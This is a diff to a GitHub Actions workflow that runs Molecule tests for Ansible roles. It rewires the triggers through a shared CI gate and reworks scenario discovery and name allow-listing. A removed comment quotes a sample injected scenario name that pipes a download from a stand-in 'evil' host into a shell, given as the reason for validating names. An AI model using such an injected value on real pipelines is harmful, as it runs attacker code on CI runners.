@@ -2,15 +2,18 @@
 name: Molecule Test
 
 on:
-  push:
-    branches: [main]
-  # Gate pull requests. Without this the per-scenario results only ever appeared
-  # on a develop->main promotion, i.e. after review, on main. See the header
-  # comment on the `molecule` job for what that hid.
-  pull_request:
-  # Callable so the upstream-revalidate listener can re-run role tests when
-  # terraform-proxmox cuts a release; manual trigger for ad-hoc runs.
+  # CI Gate owns PR and branch-push triggers so shared scenario selection and
+  # every Molecule result feed the same required Merge Gate.
   workflow_call:
+    inputs:
+      scenarios:
+        description: >-
+          JSON scenario list from the shared Ansible CI workflow. An empty
+          string requests every scenario; [] means contracts apply without a
+          Molecule scenario for this change.
+        type: string
+        default: ""
+  # Manual trigger for ad-hoc full-matrix runs.
   workflow_dispatch:
 
 permissions:
@@ -44,61 +47,50 @@ jobs:
       - name: Verify bulk data comparison static safety contract
         run: python3 tests/pve_bulk_data_compare/test_contract.py
 
-  # The scenario list is DERIVED from the filesystem, never hand-maintained.
-  #
-  # It used to be a hand-written list of `molecule test -s <name>` steps, and
-  # that list had drifted to 11 of the 25 scenarios that exist. The 14 missing
-  # ones did not fail — they simply never ran, and a hand list has no way to
-  # report what it omits. A derived list cannot omit a scenario that exists.
+      - name: Verify full-system stress NVMe JSON contract
+        run: python3 tests/pve_full_system_stress/test_nvme_sample.py
+
+      - name: Verify CI scope policy
+        run: python3 tests/workflow_policy/test_ci_scope.py
+
+  # Use the shared role-to-scenario selection. FULL discovers all scenarios
+  # only on the post-merge main push; other branch runs receive focused paths.
   discover:
     name: Discover scenarios
     runs-on: ubuntu-latest
     outputs:
-      scenarios: ${{ steps.list.outputs.scenarios }}
+      scenarios: >-
+        ${{ (inputs.scenarios != '' && inputs.scenarios != 'FULL' &&
+        inputs.scenarios) || steps.list.outputs.scenarios }}
     steps:
       - name: Checkout
         uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
-
-      - name: List every molecule scenario
+      - name: List all molecule scenarios when no narrowed list is supplied
         id: list
+        if: ${{ inputs.scenarios == '' || inputs.scenarios == 'FULL' }}
         run: |
           set -euo pipefail
-          # A scenario is a directory under molecule/ containing molecule.yml.
-          # -printf '%h' gives the directory; sed takes the basename. Avoids
-          # piping find output through xargs, which mishandles odd filenames.
-          names=$(
+          mapfile -t all_scenarios < <(
             find molecule -mindepth 2 -maxdepth 2 -name molecule.yml \
               -printf '%h\n' | sed 's#.*/##' | sort
           )
-
-          # Allow-list the names before they can reach a matrix value. This
-          # workflow runs on pull_request, so a directory name is attacker-
-          # controlled input: a scenario called `x; curl evil.sh | sh` would
-          # otherwise be interpolated straight into a shell. The run step below
-          # additionally takes the name through env rather than GitHub
-          # expression interpolation — both controls, not either.
-          #
-          # NB: do not write a literal GitHub expression anywhere in a run
-          # block, including in a shell comment. The runner substitutes them
-          # before bash ever sees the script, so an empty one is a workflow
-          # parse error that fails the whole file at startup with no job logs.
-          if bad=$(grep -vE '^[a-z0-9_]+$' <<<"$names"); [ -n "$bad" ]; then
-            echo "::error::Rejected molecule scenario name(s) outside [a-z0-9_]: $bad"
+          if [ "${#all_scenarios[@]}" -eq 0 ]; then
+            echo "::error::No Molecule scenarios discovered."
             exit 1
           fi
-
-          scenarios=$(jq -R . <<<"$names" | jq -sc .)
-          count=$(jq 'length' <<<"$scenarios")
-          if [ "$count" -eq 0 ]; then
-            echo "::error::No molecule scenarios discovered — refusing to report a vacuous pass."
-            exit 1
-          fi
-          echo "Discovered $count scenarios: $scenarios"
-          echo "scenarios=$scenarios" >> "$GITHUB_OUTPUT"
+          for scenario in "${all_scenarios[@]}"; do
+            if [[ ! "$scenario" =~ ^[a-z0-9_]+$ ]]; then
+              echo "::error::Rejected scenario name outside [a-z0-9_]."
+              exit 1
+            fi
+          done
+          scenario_json=$(printf '%s\n' "${all_scenarios[@]}" | jq -R . | jq -sc .)
+          echo "scenarios=$scenario_json" >> "$GITHUB_OUTPUT"
 
   molecule:
     name: Molecule (${{ matrix.scenario }})
     needs: discover
+    if: ${{ needs.discover.outputs.scenarios != '[]' }}
     runs-on: ubuntu-latest
     strategy:
       # LOAD-BEARING. These ran as serial steps in one job, so the first failing
@@ -146,12 +138,8 @@ jobs:
         if: steps.galaxy-cache.outputs.cache-hit != 'true'
         run: ansible-galaxy install -r requirements.yml
 
-      # molecule/default/verify.yml imports tests/container_start_contract.yml,
-      # so the `default` scenario also carries the container start contract.
-      # SCENARIO reaches the script through env, not through GitHub expression
-      # interpolation into the shell. The value is a repository directory name
-      # and this workflow now runs on pull_request, so it is untrusted input;
-      # `discover` additionally allow-lists it to [a-z0-9_].
+      # The shared workflow supplies only scenario names declared in this
+      # caller's filter map; the full-matrix fallback discovers directories.
       # Fetch the platform image before molecule needs it, retrying transient
       # registry errors. Molecule's own create step retries twice and then fails
       # the scenario, which reads as a broken role rather than a bad minute at
